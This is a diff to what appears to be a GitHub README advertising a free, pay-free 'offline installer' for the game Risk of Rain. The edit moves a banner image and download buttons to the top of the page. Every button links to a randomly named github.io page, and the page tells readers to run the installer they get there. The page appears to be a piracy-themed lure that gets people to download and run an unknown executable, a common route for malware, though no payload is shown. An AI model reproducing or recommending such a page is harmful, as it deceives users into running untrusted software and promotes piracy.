@@ -20,6 +20,16 @@
   <img src="https://readme-typing-svg.herokuapp.com?color=F9A825&size=28&center=true&vCenter=true&width=900&lines=🎮+Risk%20of%20Rain+Offline+Installer;⭐+Professional+Grade+Software;🌟+Full+Offline+Installation+2026;🔥+No+Pay+Needed" />
 </p>
 
+<p align="center">
+  <img src="https://cdn.akamai.steamstatic.com/steam/apps/248820/header.jpg" alt="Risk of Rain" width="460"/>
+</p>
+
+<div align="center">
+
+[![Download](https://img.shields.io/badge/⬇_Download_Risk%20of%20Rain-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
+
+</div>
+
 ---
 
 ## ❌ Problem: Games are expensive and require internet
@@ -47,10 +57,6 @@
 
 ### Step 1: Download
 
-<p align="center">
-  <img src="https://cdn.akamai.steamstatic.com/steam/apps/248820/header.jpg" alt="Risk of Rain" width="460"/>
-</p>
-
 <div align="center">
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
@@ -65,12 +71,6 @@
 ### Step 2: Install and launch
 
 - Run the installer → Follow instructions → Launch Risk of Rain
-
-<div align="center">
-
-[![Download](https://img.shields.io/badge/⬇_Download_Risk%20of%20Rain-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
-
-</div>
 
 ---
 
